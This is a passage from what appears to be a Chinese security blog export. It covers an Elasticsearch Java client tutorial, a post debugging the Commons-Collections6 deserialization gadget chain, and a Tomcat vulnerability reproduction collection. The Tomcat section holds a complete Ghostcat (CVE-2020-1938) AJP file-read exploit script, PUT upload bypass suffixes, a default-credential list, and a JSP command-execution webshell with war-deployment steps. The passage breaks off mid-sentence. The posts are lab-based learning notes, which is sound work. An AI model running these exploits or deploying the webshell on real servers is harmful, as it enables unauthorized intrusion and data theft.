()设置插入数据的id\n\t\t//timeout()设置超时时间\n\t\tIndexResponse index = esClient.index(indexRequest);\n\t\t//result 操作结果\n\t\tSystem.out.println(index.toString());\n\t\tSystem.out.println(index.result());\n\n\n\t}\n```\n判断是否存在文档\n```java\nvoid hasDoc() throws IOException {\n\t\tExistsSourceRequest sourceRequest=new ExistsSourceRequest.Builder()\n\t\t\t\t.index(\"test\")\n\t\t\t\t.id(\"2\")\n\t\t\t\t.build();\n\n\t\tBooleanResponse booleanResponse = esClient.existsSource(sourceRequest);\n\t\tSystem.out.println(booleanResponse);\n\t}\n```\n获取文档内容\n```java\nvoid getDoc() throws IOException {\n\t\tGetRequest getRequest=new GetRequest.Builder()\n\t\t\t\t.index(\"test\")\n\t\t\t\t.id(\"1\")\n\t\t\t\t.build();\n\n\n\t\tGetResponse<User> userGetResponse = esClient.get(getRequest, User.class);\n\t\tSystem.out.println(userGetResponse.source());\n\t}\n```\n注意实体类User必须是标准的JavaBean\n跟新文档数据\n```java\nvoid updateDoc() throws IOException {\n\t\tUser user = new User(\"yyj\",18);\n\t\tUpdateRequest updateRequest=new UpdateRequest.Builder()\n\t\t\t\t.id(\"1\")\n\t\t\t\t.index(\"test\")\n\t\t\t\t.doc(user)\n\n\t\t\t\t.build();\n\t\tUpdateResponse update = esClient.update(updateRequest, User.class);\n\t\tSystem.out.println(update);\n\t}\n```\n删除文档\n```java\nvoid deleteDoc() throws IOException {\n\t\tDeleteRequest build = new DeleteRequest.Builder()\n\t\t\t\t.index(\"test\")\n\t\t\t\t.id(\"2\")\n\t\t\t\t.build();\n\t\tDeleteResponse delete = esClient.delete(build);\n\t\tSystem.out.println(delete);\n\t}\n```\n批量操作\n```java\nvoid bulkDoc() throws IOException {\n\t\tList<BulkOperation> operations=new ArrayList<>();\n\t\tList<User> userList=new ArrayList<>();\n\t\tuserList.add(new User(\"uuu\",18));\n\t\tuserList.add(new User(\"yanyongju\",18));\n\t\tuserList.add(new User(\"youyou\",18));\n\t\tfor (int i = 0; i <userList.size(); i++) {\n\t\t\tCreateOperation createOperation =((CreateOperation.Builder)new CreateOperation.Builder()\n\t\t\t\t\t.id(\"\"+(i+2)))\n\t\t\t\t\t.document(userList.get(i))\n\t\t\t\t\t.build();\n\t\t\tBulkOperation build = (BulkOperation) new BulkOperation.Builder()\n\t\t\t\t\t.create(createOperation)\n\t\t\t\t\t.build();\n\t\t\toperations.add(build);\n\t\t}\n\n\n\t\tBulkRequest bulkRequest = new BulkRequest.Builder()\n\t\t\t\t.index(\"test\")\n\t\t\t\t.operations(operations)\n\t\t\t\t.build();\n\t\tBulkResponse bulk = esClient.bulk(bulkRequest);\n\t\tSystem.out.println(bulk.errors());\n\t}\n```\n查询\n```java\nvoid searchDoc() throws IOException {\n\t\tMatchQuery matchQuery=new MatchQuery.Builder()\n\t\t\t\t.query(\"y\")\n\t\t\t\t.field(\"name\")\n\t\t\t\t.build();\n\n\t\tMatchAllQuery matchAllQuery=new MatchAllQuery.Builder()\n\t\t\t\t.queryName(\"name\")\n\t\t\t\t.build();\n\n\t\tTermQuery termQuery=new TermQuery.Builder()\n\t\t\t\t.field(\"age\")\n\t\t\t\t.value(18)\n\t\t\t\t.build();\n\n\t\tQuery query=new Query.Builder()\n\t\t\t\t.matchAll(matchAllQuery)\n\t\t\t\t//.term(termQuery)\n\t\t\t\t.build();\n\n\t\tSearchRequest searchRequest=new SearchRequest.Builder()\n\t\t\t\t.index(\"test\")\n\t\t\t\t.query(query)\n\t\t\t\t.from(0)\n\t\t\t\t.size(10)\n\t\t\t\t.build();\n\t\t//分页精准匹配\n\t\tSearchResponse<User> search = esClient.search(searchRequest, User.class);\n\n\t\tSystem.out.println(search);\n\t}\n```\n","tags":["开发","Elasticsearch","java","数据库"]},{"title":"幽默的Commons-Collections6调试","url":"/2024/05/14/幽默的Commons-Collections6调试/","content":"\n\n\n\n\n\n# 幽默的Commons-Collections6调试\n\n\n事情是在考完期中之后，同学在调式cc6链的时候发现了奇怪问题。\n\n（下面写的过于详细了。。。）\n## 问题发现\n\n（在尝试找出cc6中 为什么LazyMap 最后要使用remove的时候）\n<img src=\"/img/24-5-14/1.png\" >\n就是lazyMap中放的是空的HashMap\n之前代码并没有向hashMap中写入任何东西，为什么在这里却必须要remove掉'aaa'才能触发链子呢\n\n于是调试\n<img src=\"/img/24-5-14/2.png\" >\n在创建TiedMapEntry的地方打上断点，跟进\n<img src=\"/img/24-5-14/3.png\" >\n赋值完map的时候还算是正常\n可是到下一步\n<img src=\"/img/24-5-14/4.png\" >\n参数map的size大小怎么突然由1变成2了？又没有对map进行任何操作\n这里LazyMap为什么多了且是什么时候多了一个键值对的？\n<img src=\"/img/24-5-14/5.png\" >\n难道后面remove移除的键值对是这个时候添加上去的吗？\n\n\n上面发现这个问题的时候，我去翻了翻以前的笔记：\n<img src=\"/img/24-5-14/6.png\" >\n当时其实也是没搞懂，就描述了情况，并没有想明白\n（好像也是在网上没找到提到过的文章）\n\n## 问题调试\n可能对于刚学java反序列化漏洞不久的来说，可能对这种情况就毫无头绪\n但凭着我对Rome链的学习，得知可能是调试器的问题\n\n于是调整代码，写入求LazyMap的大小\n```java\npackage com.yyjccc.CommonsExp;\n\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Cc6 {\n    public static Object cc6() throws Exception {\n        Transformer[] transformers=new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}),\n                new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),\n                new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"})\n        };\n        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);\n        HashMap<Object,Object> hashMap= new HashMap<>();\n        Map<Object,Object> lazyMap= LazyMap.decorate(hashMap,new ConstantTransformer(1));\n        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,\"aaa\");\n        System.out.println(lazyMap.size());\n        HashMap<Object,Object> map2=new HashMap();\n        map2.put(tiedMapEntry,\"sss\");\n        System.out.println(lazyMap.size());\n        lazyMap.remove(\"aaa\");\n        System.out.println(lazyMap.size());\n        Class c=lazyMap.getClass();\n        Field factory=c.getDeclaredField(\"factory\");\n        factory.setAccessible(true);\n        factory.set(lazyMap,chainedTransformer);\n     return map2;\n    }\n}\n\n```\n直接运行\n<img src=\"/img/24-5-14/7.png\" >\n那说明，运行的时候并不是我们刚才那个地方写入的LazyMap的\n而是在后面Hashmap put的时候插入的\n<img src=\"/img/24-5-14/8.png\" >\n\n那我们上面调式的现象又是怎么回事\n然后，调试到那个方法（构造方法）\n<img src=\"/img/24-5-14/9.png\" >\n还是size还是2\n运行完：\n<img src=\"/img/24-5-14/10.png\" >\n直接突然说wc，启动调试结果与直接运行结果不一样（：\n\n根据我之前的经验，这里应该就是调试器的问题，调试器展示对象视图的时候会自动调用对应的toString方法（我猜测就是这个问题）\n\n## 问题所在\n### 真正的写入LazyMap键值对\n运行的时候可以定位到\n<img src=\"/img/24-5-14/11.png\" >\n众所周知，HashMap的put方法会调用key的hashCode方法\n所以会调用TiedMapEntry#hashCode方法\n<img src=\"/img/24-5-14/12.png\" >\n然后是getValue方法\n<img src=\"/img/24-5-14/13.png\" >\n应为这里的map是LazyMap，\n看看LazMap#get\n<img src=\"/img/24-5-14/14.png\" >\n应为是map是之前没有赋值的HashMap ,所以一定是走的if里面，这个时候就会把key('aaa') ,value(之前LazyMap中的factoty.transform()) 写入HashMap \n\n也就是这个时候向LazyMap写入了 'aaa'-> ...  （LazyMap有这个设定...没有就写入。。。）\n\n所以若没有remove掉的话，会在反序列化的时候触发最外层HashMap key的hashCode方法就会走到这里。如果map有这个key,就不会走if里面就不会调用transform方法了\n\n\n总之是在hashmap.put方法将\n\n### 调式时候突然的写入\n直接看TiedMapEntry#toString\n<img src=\"/img/24-5-14/15.png\" >\n这里也会调用getValue与hashCode方法效果一样，\nLazyMap中没有key,就写入（...）\n导致会误以为是在构造方法里面就完成的写入\n\n\n调试器自动调用toString,所以调式那个方法的时候结果就会改变\n（idea的抽象）\n\n\n## 问题解决\n<img src=\"/img/24-5-14/16.png\" >\n设置->调式器-> 数据视图-> Java 中关闭上面两项设置\n\n\n\n\n\n\n","tags":["java安全","life","cc链"],"categories":["Life"]},{"title":"Tomcat 漏洞复现集合","url":"/2024/05/13/Tomcat-漏洞复现集合/","content":"\n\n\n\n\n# Tomcat 漏洞复现集合\n\n\n_Tomcat是常见的web中间间，常用于javaweb_\n\nTomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。\nTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。\n诀窍是，当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP 页面和Servlet。另外，Tomcat和IIS等Web服务器一样，具有处理HTML页面的功能，另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态HTML的能力不如Apache服务器。\n## Tomcat 任意文件写入（CVE-2017-12615\n\n### 简介\n\n- 漏洞简述： 当tomcat启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。\n- CVE编号：CVE-2017-12615\n- 影响范围： Tomcat 7.0.0-7.0.81（默认配置）\n\n当tomcat启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）\n```xml\n<init-param>\n  <param-name>readonly</param-name>\n  <param-value>false</param-value>\n</init-param>\n```\n### 复现\nvulhub启动Tomcat/CVE-2017-12615\n抓包改成PUT请求\n访问的是b.jsp/\n请求体是文件内容\n<img src=\"/img/24-5-13/1.png\" >\n然后get访问\n<img src=\"/img/24-5-13/2.png\" >\n也是成功存在了b.jsp   这样可以上传一个webshell达到命令执行\n说明tomcat对jsp是做了一定处理的。那么就考虑是否可以使其处理过程中对文件名的识别存在差异性，前面的流程中 b.jsp/ 识别为非jsp文件，而后续保存文件的时候，文件名不接受/字符，故而忽略掉。\n\ndefault servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。\n可以看出即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。\n这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。\n目前主要两种方法：\n\n- test.jsp::$DATA\n- test.jsp%20\n- test.jsp/\n\n利用这两种姿势PUT请求tomcat的时候，骗过tomcat而进入DefaultServlet处理的逻辑。\n我们构造的payload是put方法，所以直接断点进入了 doput：\n\n漏洞原理分析：\n[https://yaofeifly.github.io/2017/09/25/tomcat/#3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90](https://yaofeifly.github.io/2017/09/25/tomcat/#3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)\n\n\n## 文件读取/包含漏洞（CVE-2020-1938）\n### 漏洞描述\n  默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0/0）.\n\n**危害**\n攻击者可以读取 Tomcat所有 webapp目录下的任意文件。此外如果网站应用提供文件上传的功能，攻击者可以先向服务端上传一个内容含有恶意 JSP 脚本代码的文件（上传的文件本身可以是任意类型的文件，比如图片、纯文本文件等），然后利用 Ghostcat 漏洞进行文件包含，从而达到代码执行的危害\n**影响范围**\nApache Tomcat 9.x < 9.0.31\nApache Tomcat 8.x < 8.5.51\nApache Tomcat 7.x < 7.0.100\nApache Tomcat 6.x\n### 条件\n对于处在漏洞影响版本范围内的 Tomcat 而言，若其开启 AJP Connector 且攻击者能够访问 AJP Connector 服务端口的情况下，即存在被 Ghostcat 漏洞利用的风险。注意 Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009 。\n**原理**\nTomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell\n\n分析：[https://www.51cto.com/article/746415.html](https://www.51cto.com/article/746415.html)\n\n### poc\n```python\n#!/usr/bin/env python\n#CNVD-2020-10487  Tomcat-Ajp lfi\n#by ydhcui\nimport struct\nfrom io import StringIO\n\n\n# Some references:\n# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html\ndef pack_string(s):\n\tif s is None:\n\t\treturn struct.pack(\">h\", -1)\n\tl = len(s)\n\treturn struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0)\ndef unpack(stream, fmt):\n\tsize = struct.calcsize(fmt)\n\tbuf = stream.read(size)\n\treturn struct.unpack(fmt, buf)\ndef unpack_string(stream):\n\tsize, = unpack(stream, \">h\")\n\tif size == -1: # null string\n\t\treturn None\n\tres, = unpack(stream, \"%ds\" % size)\n\tstream.read(1) # \\0\n\treturn res\nclass NotFoundException(Exception):\n\tpass\nclass AjpBodyRequest(object):\n\t# server == web server, container == servlet\n\tSERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\n\tMAX_REQUEST_LENGTH = 8186\n\tdef __init__(self, data_stream, data_len, data_direction=None):\n\t\tself.data_stream = data_stream\n\t\tself.data_len = data_len\n\t\tself.data_direction = data_direction\n\tdef serialize(self):\n\t\tdata = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)\n\t\tif len(data) == 0:\n\t\t\treturn struct.pack(\">bbH\", 0x12, 0x34, 0x00)\n\t\telse:\n\t\t\tres = struct.pack(\">H\", len(data))\n\t\t\tres += data\n\t\tif self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:\n\t\t\theader = struct.pack(\">bbH\", 0x12, 0x34, len(res))\n\t\telse:\n\t\t\theader = struct.pack(\">bbH\", 0x41, 0x42, len(res))\n\t\treturn header + res\n\tdef send_and_receive(self, socket, stream):\n\t\twhile True:\n\t\t\tdata = self.serialize()\n\t\t\tsocket.send(data)\n\t\t\tr = AjpResponse.receive(stream)\n\t\t\twhile r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:\n\t\t\t\tr = AjpResponse.receive(stream)\n\n\t\t\tif r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:\n\t\t\t\tbreak\nclass AjpForwardRequest(object):\n\t_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)\n\tREQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}\n\t# server == web server, container == servlet\n\tSERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\n\tCOMMON_HEADERS = [\"SC_REQ_ACCEPT\",\n\t\t\"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\",\n\t\t\"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\",\n\t\t\"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\"\n\t]\n\tATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"]\n\tdef __init__(self, data_direction=None):\n\t\tself.prefix_code = 0x02\n\t\tself.method = None\n\t\tself.protocol = None\n\t\tself.req_uri = None\n\t\tself.remote_addr = None\n\t\tself.remote_host = None\n\t\tself.server_name = None\n\t\tself.server_port = None\n\t\tself.is_ssl = None\n\t\tself.num_headers = None\n\t\tself.request_headers = None\n\t\tself.attributes = None\n\t\tself.data_direction = data_direction\n\tdef pack_headers(self):\n\t\tself.num_headers = len(self.request_headers)\n\t\tres = \"\"\n\t\tres = struct.pack(\">h\", self.num_headers)\n\t\tfor h_name in self.request_headers:\n\t\t\tif h_name.startswith(\"SC_REQ\"):\n\t\t\t\tcode = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1\n\t\t\t\tres += struct.pack(\"BB\", 0xA0, code)\n\t\t\telse:\n\t\t\t\tres += pack_string(h_name)\n\n\t\t\tres += pack_string(self.request_headers[h_name])\n\t\treturn res\n\n\tdef pack_attributes(self):\n\t\tres = b\"\"\n\t\tfor attr in self.attributes:\n\t\t\ta_name = attr['name']\n\t\t\tcode = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1\n\t\t\tres += struct.pack(\"b\", code)\n\t\t\tif a_name == \"req_attribute\":\n\t\t\t\taa_name, a_value = attr['value']\n\t\t\t\tres += pack_string(aa_name)\n\t\t\t\tres += pack_string(a_value)\n\t\t\telse:\n\t\t\t\tres += pack_string(attr['value'])\n\t\tres += struct.pack(\"B\", 0xFF)\n\t\treturn res\n\tdef serialize(self):\n\t\tres = \"\"\n\t\tres = struct.pack(\"bb\", self.prefix_code, self.method)\n\t\tres += pack_string(self.protocol)\n\t\tres += pack_string(self.req_uri)\n\t\tres += pack_string(self.remote_addr)\n\t\tres += pack_string(self.remote_host)\n\t\tres += pack_string(self.server_name)\n\t\tres += struct.pack(\">h\", self.server_port)\n\t\tres += struct.pack(\"?\", self.is_ssl)\n\t\tres += self.pack_headers()\n\t\tres += self.pack_attributes()\n\t\tif self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:\n\t\t\theader = struct.pack(\">bbh\", 0x12, 0x34, len(res))\n\t\telse:\n\t\t\theader = struct.pack(\">bbh\", 0x41, 0x42, len(res))\n\t\treturn header + res\n\tdef parse(self, raw_packet):\n\t\tstream = StringIO(raw_packet)\n\t\tself.magic1, self.magic2, data_len = unpack(stream, \"bbH\")\n\t\tself.prefix_code, self.method = unpack(stream, \"bb\")\n\t\tself.protocol = unpack_string(stream)\n\t\tself.req_uri = unpack_string(stream)\n\t\tself.remote_addr = unpack_string(stream)\n\t\tself.remote_host = unpack_string(stream)\n\t\tself.server_name = unpack_string(stream)\n\t\tself.server_port = unpack(stream, \">h\")\n\t\tself.is_ssl = unpack(stream, \"?\")\n\t\tself.num_headers, = unpack(stream, \">H\")\n\t\tself.request_headers = {}\n\t\tfor i in range(self.num_headers):\n\t\t\tcode, = unpack(stream, \">H\")\n\t\t\tif code > 0xA000:\n\t\t\t\th_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]\n\t\t\telse:\n\t\t\t\th_name = unpack(stream, \"%ds\" % code)\n\t\t\t\tstream.read(1) # \\0\n\t\t\th_value = unpack_string(stream)\n\t\t\tself.request_headers[h_name] = h_value\n\tdef send_and_receive(self, socket, stream, save_cookies=False):\n\t\tres = []\n\t\ti = socket.sendall(self.serialize())\n\t\tif self.method == AjpForwardRequest.POST:\n\t\t\treturn res\n\n\t\tr = AjpResponse.receive(stream)\n\t\tassert r.prefix_code == AjpResponse.SEND_HEADERS\n\t\tres.append(r)\n\t\tif save_cookies and 'Set-Cookie' in r.response_headers:\n\t\t\tself.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']\n\n\t\t# read body chunks and end response packets\n\t\twhile True:\n\t\t\tr = AjpResponse.receive(stream)\n\t\t\tres.append(r)\n\t\t\tif r.prefix_code == AjpResponse.END_RESPONSE:\n\t\t\t\tbreak\n\t\t\telif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:\n\t\t\t\tcontinue\n\t\t\telse:\n\t\t\t\traise NotImplementedError\n\t\t\t\tbreak\n\n\t\treturn res\n\nclass AjpResponse(object):\n\t_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)\n\tCOMMON_SEND_HEADERS = [\n\t\t\t\"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\",\n\t\t\t\"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\"\n\t\t\t]\n\tdef parse(self, stream):\n\t\t# read headers\n\t\tself.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\")\n\n\t\tif self.prefix_code == AjpResponse.SEND_HEADERS:\n\t\t\tself.parse_send_headers(stream)\n\t\telif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:\n\t\t\tself.parse_send_body_chunk(stream)\n\t\telif self.prefix_code == AjpResponse.END_RESPONSE:\n\t\t\tself.parse_end_response(stream)\n\t\telif self.prefix_code == AjpResponse.GET_BODY_CHUNK:\n\t\t\tself.parse_get_body_chunk(stream)\n\t\telse:\n\t\t\traise NotImplementedError\n\n\tdef parse_send_headers(self, stream):\n\t\tself.http_status_code, = unpack(stream, \">H\")\n\t\tself.http_status_msg = unpack_string(stream)\n\t\tself.num_headers, = unpack(stream, \">H\")\n\t\tself.response_headers = {}\n\t\tfor i in range(self.num_headers):\n\t\t\tcode, = unpack(stream, \">H\")\n\t\t\tif code <= 0xA000: # custom header\n\t\t\t\th_name, = unpack(stream, \"%ds\" % code)\n\t\t\t\tstream.read(1) # \\0\n\t\t\t\th_value = unpack_string(stream)\n\t\t\telse:\n\t\t\t\th_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]\n\t\t\t\th_value = unpack_string(stream)\n\t\t\tself.response_headers[h_name] = h_value\n\n\tdef parse_send_body_chunk(self, stream):\n\t\tself.data_length, = unpack(stream, \">H\")\n\t\tself.data = stream.read(self.data_length+1)\n\n\tdef parse_end_response(self, stream):\n\t\tself.reuse, = unpack(stream, \"b\")\n\n\tdef parse_get_body_chunk(self, stream):\n\t\trlen, = unpack(stream, \">H\")\n\t\treturn rlen\n\n\t@staticmethod\n\tdef receive(stream):\n\t\tr = AjpResponse()\n\t\tr.parse(stream)\n\t\treturn r\n\nimport socket\n\ndef prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):\n\tfr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)\n\tfr.method = method\n\tfr.protocol = \"HTTP/1.1\"\n\tfr.req_uri = req_uri\n\tfr.remote_addr = target_host\n\tfr.remote_host = None\n\tfr.server_name = target_host\n\tfr.server_port = 80\n\tfr.request_headers = {\n\t\t'SC_REQ_ACCEPT': 'text/html',\n\t\t'SC_REQ_CONNECTION': 'keep-alive',\n\t\t'SC_REQ_CONTENT_LENGTH': '0',\n\t\t'SC_REQ_HOST': target_host,\n\t\t'SC_REQ_USER_AGENT': 'Mozilla',\n\t\t'Accept-Encoding': 'gzip, deflate, sdch',\n\t\t'Accept-Language': 'en-US,en;q=0.5',\n\t\t'Upgrade-Insecure-Requests': '1',\n\t\t'Cache-Control': 'max-age=0'\n\t}\n\tfr.is_ssl = False\n\tfr.attributes = []\n\treturn fr\n\nclass Tomcat(object):\n\tdef __init__(self, target_host, target_port):\n\t\tself.target_host = target_host\n\t\tself.target_port = target_port\n\n\t\tself.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\t\tself.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\t\tself.socket.connect((target_host, target_port))\n\t\tself.stream = self.socket.makefile(\"rb\")\n\t\t#self.stream = self.socket.makefile(\"rb\", bufsize=0)\n\n\tdef perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):\n\t\tself.req_uri = req_uri\n\t\tself.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))\n\t\tprint(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri))\n\t\tif user is not None and password is not None:\n\t\t\tself.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '')\n\t\tfor h in headers:\n\t\t\tself.forward_request.request_headers[h] = headers[h]\n\t\tfor a in attributes:\n\t\t\tself.forward_request.attributes.append(a)\n\t\tresponses = self.forward_request.send_and_receive(self.socket, self.stream)\n\t\tif len(responses) == 0:\n\t\t\treturn None, None\n\t\tsnd_hdrs_res = responses[0]\n\t\tdata_res = responses[1:-1]\n\t\tif len(data_res) == 0:\n\t\t\tprint(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers)\n\t\treturn snd_hdrs_res, data_res\n\n'''\njavax.servlet.include.request_uri\njavax.servlet.include.path_info\njavax.servlet.include.servlet_path\n'''\n\nimport argparse\nparser = argparse.ArgumentParser()\nparser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\")\nparser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\")\nparser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\")\nargs = parser.parse_args()\nt = Tomcat(args.target, args.port)\n_,data = t.perform_request('/asdf',attributes=[\n    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},\n    {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},\n    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},\n    ])\nprint('----------------------------')\nprint(\"\".join([d.data.decode(\"utf-8\") for d in data]))\n```\n\n\n## Tomcat弱口令&war远程部署\n### 漏洞介绍\n在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令，使用工具对其进行穷举。得到密码后，也可以进行后台上传恶意代码控制服务器。\n**影响范围**\nTomcat版本：7.0–>8.0\n\n\n**原理**\n在tomcat8环境下默认进入后台的密码为tomcat/tomcat，未修改造成未授权即可进入后台。Tomcat后台提供war包部署功能，实现上传webshell。\n\n\n### 复现\n环境：vulhub/tomcat/tomcat\n<img src=\"/img/24-5-13/3.png\" >\n抓包\n<img src=\"/img/24-5-13/4.png\" >\nAuthorization头base64解码\n<img src=\"/img/24-5-13/5.png\" >\n用户名：密码  形式再base64编码\n可用户名密码进行爆破(好像爆破一个用户就会被ban)\n默认用户名和密码\n```python\ntomcat:tomcat\nboth:tomcat\nrole1:tomcat\nadmin:\nadmin:password\nadmin:admin\n```\n使用默认tomcat:tomcat登录\n<img src=\"/img/24-5-13/6.png\" >\n\n编写webshell\n```python\n<%@ page import=\"java.util.*,java.io.*\"%>\n<HTML><BODY>\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\n<INPUT TYPE=\"text\" NAME=\"cmd\">\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\n</FORM>\n<pre>\n<%\nif (request.getParameter(\"cmd\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\n        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n                out.println(disr); \n                disr = dis.readLine(); \n                }\n        }\n%>\n</pre>\n</BODY></HTML>\n \n \n```\n打成war包\n```powershell\njar -cvf test.war .\n```\n<img src=\"/img/24-5-13/7.png\" >\n部署成功\n访问/test/shell.jsp\n<img src=\"/img/24-5-13/8.png\" >\n\n## RCE (CVE-2019-0232)\n### 漏洞描述\n(感觉条件苛刻，利用鸡肋)\n由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI 